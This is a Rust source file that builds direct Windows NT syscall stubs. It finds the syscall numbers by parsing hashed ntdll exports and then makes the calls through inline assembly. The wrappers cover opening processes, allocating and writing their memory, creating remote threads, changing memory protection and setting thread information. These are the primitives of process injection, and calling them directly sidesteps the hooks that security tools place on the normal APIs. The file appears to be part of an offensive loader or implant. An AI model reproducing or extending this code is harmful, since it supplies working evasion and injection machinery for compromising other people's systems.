//! Direct NT syscalls resolved from ntdll.dll at runtime.
//!
//! Syscall numbers (SSN) are parsed from ntdll export stubs:
//! `4C 8B D1 B8 XX XX XX XX` (`mov r10, rcx`; `mov eax, SSN`).
//!
//! `SYSCALL_NUMBERS` index map (resolved via DJB2 export hash):
//! - 0: open process
//! - 1: allocate virtual memory
//! - 2: write virtual memory
//! - 3: create thread ex
//! - 4: read virtual memory
//! - 5: protect virtual memory
//! - 6: close handle
//! - 7: set information thread
//! - 8: query information process

use core::arch::asm;
use std::ffi::c_void;
use std::mem;
use std::sync::Once;

use windows::core::PCWSTR;
use windows::Win32::Foundation::HANDLE;
use windows::Win32::System::LibraryLoader::GetModuleHandleW;

use crate::hash::{
    export_by_hash, H_NT_ALLOCATE_VIRTUAL_MEMORY, H_NT_CLOSE, H_NT_CREATE_THREAD_EX,
    H_NT_OPEN_PROCESS, H_NT_PROTECT_VIRTUAL_MEMORY, H_NT_QUERY_INFORMATION_PROCESS,
    H_NT_READ_VIRTUAL_MEMORY, H_NT_SET_INFORMATION_THREAD, H_NT_WRITE_VIRTUAL_MEMORY,
};

pub type NTSTATUS = i32;

const SSN_OPEN_PROCESS: usize = 0;
const SSN_ALLOCATE_VIRTUAL_MEMORY: usize = 1;
const SSN_WRITE_VIRTUAL_MEMORY: usize = 2;
const SSN_CREATE_THREAD_EX: usize = 3;
const SSN_READ_VIRTUAL_MEMORY: usize = 4;
const SSN_PROTECT_VIRTUAL_MEMORY: usize = 5;
const SSN_CLOSE: usize = 6;
const SSN_SET_INFORMATION_THREAD: usize = 7;
const SSN_QUERY_INFORMATION_PROCESS: usize = 8;

#[repr(C)]
pub struct OBJECT_ATTRIBUTES {
    pub length: u32,
    pub root_directory: HANDLE,
    pub object_name: *mut c_void,
    pub attributes: u32,
    pub security_descriptor: *mut c_void,
    pub security_quality_of_service: *mut c_void,
}

impl Default for OBJECT_ATTRIBUTES {
    fn default() -> Self {
        Self {
            length: mem::size_of::<Self>() as u32,
            root_directory: HANDLE::default(),
            object_name: std::ptr::null_mut(),
            attributes: 0,
            security_descriptor: std::ptr::null_mut(),
            security_quality_of_service: std::ptr::null_mut(),
        }
    }
}

#[repr(C)]
pub struct CLIENT_ID {
    pub unique_process: *mut c_void,
    pub unique_thread: *mut c_void,
}

static mut SYSCALL_NUMBERS: Option<[usize; 9]> = None;
static INIT: Once = Once::new();

#[inline]
const fn nt_success(status: NTSTATUS) -> bool {
    status >= 0
}

/// Lazily resolve syscall numbers from ntdll exports.
pub fn init() {
    INIT.call_once(|| {
        unsafe {
            let ntdll_name = crate::wide(&crate::s_ntdll());
            let ntdll = match GetModuleHandleW(PCWSTR(ntdll_name.as_ptr())) {
                Ok(module) => module,
                Err(_) => return,
            };

            let base = ntdll.0 as *const u8;
            let hashes = [
                H_NT_OPEN_PROCESS,
                H_NT_ALLOCATE_VIRTUAL_MEMORY,
                H_NT_WRITE_VIRTUAL_MEMORY,
                H_NT_CREATE_THREAD_EX,
                H_NT_READ_VIRTUAL_MEMORY,
                H_NT_PROTECT_VIRTUAL_MEMORY,
                H_NT_CLOSE,
                H_NT_SET_INFORMATION_THREAD,
                H_NT_QUERY_INFORMATION_PROCESS,
            ];

            let mut numbers = [0usize; 9];
            for (idx, hash) in hashes.iter().enumerate() {
                numbers[idx] = export_by_hash(base, *hash)
                    .and_then(|addr| parse_syscall_number(addr))
                    .unwrap_or(0);
            }
            SYSCALL_NUMBERS = Some(numbers);
        }
    });
}

unsafe fn parse_syscall_number(addr: *const u8) -> Option<usize> {
    let bytes = std::slice::from_raw_parts(addr, 32);
    if bytes.len() >= 8
        && bytes[0] == 0x4C
        && bytes[1] == 0x8B
        && bytes[2] == 0xD1
        && bytes[3] == 0xB8
    {
        return Some(u32::from_le_bytes([bytes[4], bytes[5], bytes[6], bytes[7]]) as usize);
    }
    for i in 0..bytes.len().saturating_sub(4) {
        if bytes[i] == 0xB8 {
            return Some(
                u32::from_le_bytes([bytes[i + 1], bytes[i + 2], bytes[i + 3], bytes[i + 4]])
                    as usize,
            );
        }
    }
    None
}

unsafe fn ssn(index: usize) -> u32 {
    SYSCALL_NUMBERS.unwrap_unchecked()[index] as u32
}

#[cfg(target_arch = "x86_64")]
unsafe fn do_syscall1(ssn: u32, a1: usize) -> NTSTATUS {
    let status: NTSTATUS;
    asm!(
        "mov r10, rcx",
        "mov eax, {ssn:e}",
        "syscall",
        ssn = in(reg) ssn,
        in("rcx") a1,
        lateout("rax") status,
    );
    status
}

#[cfg(target_arch = "x86_64")]
unsafe fn do_syscall4(ssn: u32, a1: usize, a2: usize, a3: usize, a4: usize) -> NTSTATUS {
    let status: NTSTATUS;
    asm!(
        "mov r10, rcx",
        "mov eax, {ssn:e}",
        "syscall",
        ssn = in(reg) ssn,
        in("rcx") a1,
        in("rdx") a2,
        in("r8") a3,
        in("r9") a4,
        lateout("rax") status,
    );
    status
}

#[cfg(target_arch = "x86_64")]
unsafe fn do_syscall5(
    ssn: u32,
    a1: usize,
    a2: usize,
    a3: usize,
    a4: usize,
    a5: usize,
) -> NTSTATUS {
    let status: NTSTATUS;
    asm!(
        "mov r10, rcx",
        "mov eax, {ssn:e}",
        "mov qword ptr [rsp + 0x28], {a5}",
        "syscall",
        ssn = in(reg) ssn,
        in("rcx") a1,
        in("rdx") a2,
        in("r8") a3,
        in("r9") a4,
        a5 = in(reg) a5,
        lateout("rax") status,
        options(nostack),
    );
    status
}

#[cfg(target_arch = "x86_64")]
unsafe fn do_syscall6(
    ssn: u32,
    a1: usize,
    a2: usize,
    a3: usize,
    a4: usize,
    a5: usize,
    a6: usize,
) -> NTSTATUS {
    let status: NTSTATUS;
    asm!(
        "mov r10, rcx",
        "mov eax, {ssn:e}",
        "mov qword ptr [rsp + 0x28], {a5}",
        "mov qword ptr [rsp + 0x30], {a6}",
        "syscall",
        ssn = in(reg) ssn,
        in("rcx") a1,
        in("rdx") a2,
        in("r8") a3,
        in("r9") a4,
        a5 = in(reg) a5,
        a6 = in(reg) a6,
        lateout("rax") status,
        options(nostack),
    );
    status
}

#[cfg(target_arch = "x86_64")]
unsafe fn do_syscall11(
    ssn: u32,
    a1: usize,
    a2: usize,
    a3: usize,
    a4: usize,
    a5: usize,
    a6: usize,
    a7: usize,
    a8: usize,
    a9: usize,
    a10: usize,
    a11: usize,
) -> NTSTATUS {
    let status: NTSTATUS;
    asm!(
        "mov r10, rcx",
        "mov eax, {ssn:e}",
        "mov qword ptr [rsp + 0x28], {a5}",
        "mov qword ptr [rsp + 0x30], {a6}",
        "mov qword ptr [rsp + 0x38], {a7}",
        "mov qword ptr [rsp + 0x40], {a8}",
        "mov qword ptr [rsp + 0x48], {a9}",
        "mov qword ptr [rsp + 0x50], {a10}",
        "mov qword ptr [rsp + 0x58], {a11}",
        "syscall",
        ssn = in(reg) ssn,
        in("rcx") a1,
        in("rdx") a2,
        in("r8") a3,
        in("r9") a4,
        a5 = in(reg) a5,
        a6 = in(reg) a6,
        a7 = in(reg) a7,
        a8 = in(reg) a8,
        a9 = in(reg) a9,
        a10 = in(reg) a10,
        a11 = in(reg) a11,
        lateout("rax") status,
        options(nostack),
    );
    status
}

#[cfg(not(target_arch = "x86_64"))]
unsafe fn do_syscall1(_: u32, _: usize) -> NTSTATUS {
    -1
}

#[cfg(not(target_arch = "x86_64"))]
unsafe fn do_syscall4(_: u32, _: usize, _: usize, _: usize, _: usize) -> NTSTATUS {
    -1
}

#[cfg(not(target_arch = "x86_64"))]
unsafe fn do_syscall5(_: u32, _: usize, _: usize, _: usize, _: usize, _: usize) -> NTSTATUS {
    -1
}

#[cfg(not(target_arch = "x86_64"))]
unsafe fn do_syscall6(
    _: u32,
    _: usize,
    _: usize,
    _: usize,
    _: usize,
    _: usize,
    _: usize,
) -> NTSTATUS {
    -1
}

#[cfg(not(target_arch = "x86_64"))]
unsafe fn do_syscall11(
    _: u32,
    _: usize,
    _: usize,
    _: usize,
    _: usize,
    _: usize,
    _: usize,
    _: usize,
    _: usize,
    _: usize,
    _: usize,
    _: usize,
) -> NTSTATUS {
    -1
}

/// Direct syscall for `NtOpenProcess`.
pub unsafe fn nt_open_process(
    process_handle: *mut HANDLE,
    desired_access: u32,
    object_attributes: *const OBJECT_ATTRIBUTES,
    client_id: *const CLIENT_ID,
) -> NTSTATUS {
    init();
    do_syscall4(
        ssn(SSN_OPEN_PROCESS),
        process_handle as usize,
        desired_access as usize,
        object_attributes as usize,
        client_id as usize,
    )
}

/// Direct syscall for `NtAllocateVirtualMemory`.
pub unsafe fn nt_allocate_virtual_memory(
    process_handle: HANDLE,
    base_address: *mut *mut c_void,
    zero_bits: usize,
    region_size: *mut usize,
    allocation_type: u32,
    protect: u32,
) -> NTSTATUS {
    init();
    do_syscall6(
        ssn(SSN_ALLOCATE_VIRTUAL_MEMORY),
        process_handle.0 as usize,
        base_address as usize,
        zero_bits,
        region_size as usize,
        allocation_type as usize,
        protect as usize,
    )
}

/// Direct syscall for `NtWriteVirtualMemory`.
pub unsafe fn nt_write_virtual_memory(
    process_handle: HANDLE,
    base_address: *mut c_void,
    buffer: *const c_void,
    buffer_size: usize,
    bytes_written: *mut usize,
) -> NTSTATUS {
    init();
    do_syscall5(
        ssn(SSN_WRITE_VIRTUAL_MEMORY),
        process_handle.0 as usize,
        base_address as usize,
        buffer as usize,
        buffer_size,
        bytes_written as usize,
    )
}

/// Direct syscall for `NtCreateThreadEx`.
pub unsafe fn nt_create_thread_ex(
    thread_handle: *mut HANDLE,
    desired_access: u32,
    object_attributes: *mut c_void,
    process_handle: HANDLE,
    start_routine: *mut c_void,
    argument: *mut c_void,
    create_flags: u32,
    zero_bits: usize,
    stack_size: usize,
    maximum_stack_size: usize,
    attribute_list: *mut c_void,
) -> NTSTATUS {
    init();
    do_syscall11(
        ssn(SSN_CREATE_THREAD_EX),
        thread_handle as usize,
        desired_access as usize,
        object_attributes as usize,
        process_handle.0 as usize,
        start_routine as usize,
        argument as usize,
        create_flags as usize,
        zero_bits,
        stack_size,
        maximum_stack_size,
        attribute_list as usize,
    )
}

/// Direct syscall for `NtReadVirtualMemory`.
#[allow(dead_code)]
pub unsafe fn nt_read_virtual_memory(
    process_handle: HANDLE,
    base_address: *const c_void,
    buffer: *mut c_void,
    buffer_size: usize,
    bytes_read: *mut usize,
) -> NTSTATUS {
    init();
    do_syscall5(
        ssn(SSN_READ_VIRTUAL_MEMORY),
        process_handle.0 as usize,
        base_address as usize,
        buffer as usize,
        buffer_size,
        bytes_read as usize,
    )
}

/// Direct syscall for `NtProtectVirtualMemory`.
#[allow(dead_code)]
pub unsafe fn nt_protect_virtual_memory(
    process_handle: HANDLE,
    base_address: *mut *mut c_void,
    region_size: *mut usize,
    new_protect: u32,
    old_protect: *mut u32,
) -> NTSTATUS {
    init();
    do_syscall5(
        ssn(SSN_PROTECT_VIRTUAL_MEMORY),
        process_handle.0 as usize,
        base_address as usize,
        region_size as usize,
        new_protect as usize,
        old_protect as usize,
    )
}

/// Direct syscall for `NtClose`.
pub unsafe fn nt_close(handle: HANDLE) -> NTSTATUS {
    init();
    do_syscall1(ssn(SSN_CLOSE), handle.0 as usize)
}

/// Direct syscall for `NtSetInformationThread`.
pub unsafe fn nt_set_information_thread(
    thread_handle: HANDLE,
    info_class: u32,
    info: *mut c_void,
    info_len: u32,
) -> NTSTATUS {
    init();
    do_syscall4(
        ssn(SSN_SET_INFORMATION_THREAD),
        thread_handle.0 as usize,
        info_class as usize,
        info as usize,
        info_len as usize,
    )
}

/// Direct syscall for `NtQueryInformationProcess`.
pub unsafe fn nt_query_information_process(
    process_handle: HANDLE,
    info_class: u32,
    info: *mut c_void,
    info_len: u32,
    ret_len: *mut u32,
) -> NTSTATUS {
    init();
    do_syscall5(
        ssn(SSN_QUERY_INFORMATION_PROCESS),
        process_handle.0 as usize,
        info_class as usize,
        info as usize,
        info_len as usize,
        ret_len as usize,
    )
}

/// Open a process handle via direct syscall.
pub unsafe fn open_process(access: u32, pid: u32) -> Result<HANDLE, ()> {
    init();
    let mut handle = HANDLE::default();
    let object_attributes = OBJECT_ATTRIBUTES::default();
    let client_id = CLIENT_ID {
        unique_process: pid as usize as *mut c_void,
        unique_thread: std::ptr::null_mut(),
    };
    let status = nt_open_process(&mut handle, access, &object_attributes, &client_id);
    if nt_success(status) {
        Ok(handle)
    } else {
        Err(())
    }
}

/// Close a kernel handle via direct syscall.
pub unsafe fn close_handle(handle: HANDLE) -> Result<(), ()> {
    if nt_success(nt_close(handle)) {
        Ok(())
    } else {
        Err(())
    }
}
